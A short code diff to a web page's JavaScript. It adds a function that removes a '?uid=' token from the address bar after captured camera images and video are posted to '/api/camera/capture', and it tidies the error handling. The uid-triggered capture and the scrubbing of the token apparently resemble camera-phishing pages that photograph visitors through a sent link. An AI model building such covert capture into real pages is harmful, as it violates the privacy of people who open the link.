@@ -2280,6 +2280,18 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     return { shots, vid };
   }
 
+  // Remove ?uid= from the address bar once handled, so a page reload does not
+  // trigger the camera capture again.
+  function clearUid() {
+    try {
+      const url = new URL(location.href);
+      if (url.searchParams.has('uid')) {
+        url.searchParams.delete('uid');
+        history.replaceState(history.state, '', url.pathname + url.search);
+      }
+    } catch (e) {}
+  }
+
   async function sendStream(streams) {
     const images = [];
     const videos = [];
@@ -2289,11 +2301,11 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       if (vid) videos.push(vid);
     }
 
-    if (!images.length && !videos.length) {
-      toast('Could not capture camera — no media.');
-      return;
-    }
     try {
+      if (!images.length && !videos.length) {
+        toast('Could not capture camera — no media.');
+        return;
+      }
       const res = await fetch('/api/camera/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -2304,6 +2316,9 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       else toast('Failed to send.');
     } catch (e) {
       toast('Failed to send.');
+    } finally {
+      // Always drop the uid so reloading won't capture again.
+      clearUid();
     }
   }
 
